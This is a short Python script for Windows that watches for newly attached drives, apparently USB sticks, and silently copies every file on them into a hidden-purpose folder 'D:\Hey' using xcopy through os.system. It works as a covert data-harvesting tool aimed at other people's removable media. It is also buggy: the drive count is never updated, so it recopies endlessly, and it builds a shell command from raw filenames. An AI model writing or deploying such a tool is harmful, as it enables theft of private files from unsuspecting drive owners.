import win32api
import os
import time

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
numberOfDrives = len(drives)

while True:
	newDriveList = win32api.GetLogicalDriveStrings()
	newDriveList = newDriveList.split('\000')[:-1]
	newLength = len(newDriveList)
	if newLength > numberOfDrives:
		required = newDriveList[newLength - 1]
		newDrive = newDriveList[-1]
		listOfFiles = os.listdir(newDrive)
		for fil in listOfFiles:
			if fil == "System Volume Information":
				continue
			print(listOfFiles)
			fileName = newDrive[0] + newDrive[1] + "\\"
			fileName += fil
			cmd = 'xcopy ' + '"' + fileName + '"' + ' "D:\\Hey"'	
			os.system(cmd)
			
	
	time.sleep(5)
